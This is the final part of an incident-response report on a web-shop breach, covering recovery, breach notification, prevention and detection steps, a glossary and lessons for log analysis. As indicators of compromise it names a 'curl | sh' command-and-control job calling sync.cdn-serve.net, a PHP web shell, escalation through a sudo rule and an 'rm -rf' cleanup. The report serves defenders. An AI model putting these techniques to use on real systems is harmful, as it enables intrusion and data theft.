RECOVER (this month)

  1. Stand up a clean, monitored environment from known-good images; restore and verify data integrity; bring traffic back in stages with heightened logging.
  2. Notify: engage legal/DPO immediately — the GDPR 72-hour clock starts at awareness, which is today. Prepare regulator and customer notifications using the real row counts from the database.
  3. Notify the payment processor / card brands if payment data is in scope, per contract.
  4. Notify affected customers plainly, with advice to expect targeted phishing and to change any reused passwords.

PREVENT (this quarter)

  1. Deploy the five detection rules from 8.1 — all have a measured zero false-positive rate on 95 days of baseline. Start with the admin-login-from-new-IP rule and the www-data-invoked-sudo rule.
  2. Centralise and retain all three log types off-host for 12–18 months with clock synchronisation, and include resolver DNS logs — DNS gave the earliest warning here, 36 seconds before the firewall did.
  3. Adopt secure-SDLC controls: SAST/DAST in CI, dependency scanning, and mandatory security review for any endpoint that accepts a file or a query parameter.
  4. Rebuild the environment so that one application flaw cannot reach the database: separate the web tier from the data tier, put the database on a private network, use a read-only replica for reporting, and manage secrets in a secret manager.
  5. Add a quarterly access review: getent group sudo, all UID≥1000 accounts, all of /etc/cron.d, the upload directory, and the full outbound-destination allow-list — compared against the baseline in section 2.8 of this analysis.

9. Glossary — every term used above

TermPlain-English meaning
Access logThe web server's diary: one line per HTTP request. Who, when, what, what happened.
BaselineA written description of what normal activity looks like on this system, built before you hunt for anything abnormal. The single most important habit in log analysis.
Bot / crawlerAn automated program visiting websites. Search engines, uptime monitors and security scanners are all bots. Most are harmless; some are hostile; all identify themselves in the User-Agent.
brute force / password spray / credential stuffingTrying many passwords (brute force), a few common passwords against many accounts (spray), or leaked username+password pairs from another breach (stuffing).
C2 / command and controlInfrastructure an attacker uses to keep control of a compromised machine — here, the hourly curl | sh to sync.cdn-serve.net.
CorrelationProving the same event from two or more independent sources. One log is a rumour; two agreeing to the second is proof.
DNSThe phone book that turns names into IP addresses. dnsmasq is the resolver on this host, and its query log is the earliest warning of the exfiltration.
EgressTraffic leaving your network. You cannot prevent every ingress attack, so egress monitoring is often your best detection control — and it is what caught this case.
ExfiltrationGetting data out. Here, one HTTPS POST of a 3-table database archive to an unknown server.
fail2banA service that reads auth logs and adds repeat offenders to a firewall blocklist. The Ban lines in the syslog are it working correctly.
False positiveAn alert that fires on something harmless. The enemy of detection: enough false positives and analysts stop reading alerts — and then miss the real one.
IOC (Indicator of Compromise)An artefact that shows a system was breached: an IP, a domain, a URL, a file path, a cron line, an account name. Useful only with a role attached.
Kill chainThe ordered stages of an intrusion: reconnaissance → exploitation → access → escalation → collection → exfiltration → persistence → actions on objectives.
Log samplingRecording only some events (e.g. the first few packets of a session). Why independent logs disagree on counts, and why you report "at least N".
Netfilter / UFW / iptablesLinux's firewall. [UFW ALLOW] / [UFW BLOCK] plus the packet's fields. IN=eth0 OUT= (empty) = inbound; IN= OUT=eth0 = outbound.
PHP web shellA PHP script uploaded to a web server that lets its holder run operating-system commands through the browser. Here /uploads/store_theme_v3.php.
Privilege escalationGoing from a low-privilege account to a higher one — here www-data to root, in one command, via a passwordless sudo rule for python3.
ReconnaissanceLearning about a target before attacking it: what software it runs, where the admin panel is, which ports are open. Here from a Tor exit node on 30 July.
SQL injection (SQLi)Making a database execute attacker-supplied SQL by breaking out of a string that the application glued into a query. Here, parameter q on /shop/search.php.
sqlmapA free, legitimate tool that automates SQL-injection attacks. Its presence in a log is suspicion, never proof — see the two-actor comparison in 6.1.
sudo / sudoers / NOPASSWDLinux's privilege-escalation mechanism and its rule file. NOPASSWD for an interpreter is equivalent to handing over root.
syslogThe operating system's general event log. On Linux the useful field is program[pid]: — sorting by program name is a powerful triage technique.
Tarball (.tar.gz)Several files combined into one archive and compressed. Cheaper and quieter to exfiltrate than separate files.
User-AgentThe "browser name" a client claims. Bots usually state their tool name here, which makes the field one of your best hunting tools — and a terrible sole detection criterion.
curl … | shDownload a remote script and execute it immediately, leaving no file on disk. Far harder to detect and to forensics than downloading a file, because there is nothing to hash.
Web root / document rootThe directory the web server serves files from — /var/www/html here. Anything inside it can potentially be executed by PHP.

Ten things to remember if you remember nothing else

  1. Baseline first. You cannot find the attack; you can only recognise it as not normal.
  2. Correlate. One log is a rumour. The sudo at 14:41:22 plus the syslog at 14:41:23 is a case; either alone is a maybe.
  3. Ask what they got, not what they tried. Noise is defined by the absence of a result.
  4. Tool signature ≠ breach. 144.217.31.248 ran sqlmap for eight days and achieved absolutely nothing, because the parameter was an integer.
  5. Status codes are evidence. 200 = it ran. 500 = it ran and errored. 400 = the database was never involved. 302 = authenticated.
  6. Byte counts are evidence. 790 bytes for the first cmd=id, 2,152 for the second. The privilege change is visible in the size column.
  7. The absence of your own admin is a signal. Eight silent days is why this was noticed at all.
  8. Count program frequencies. One useradd in 95 days is a beacon.
  9. Correlation in time is not causation. The malicious cron fired 120 seconds before the 15 Aug outage. It meant nothing.
  10. Logs survive deleted files. The attacker ran rm -rf /tmp/shop and failed to erase a single thing that mattered.
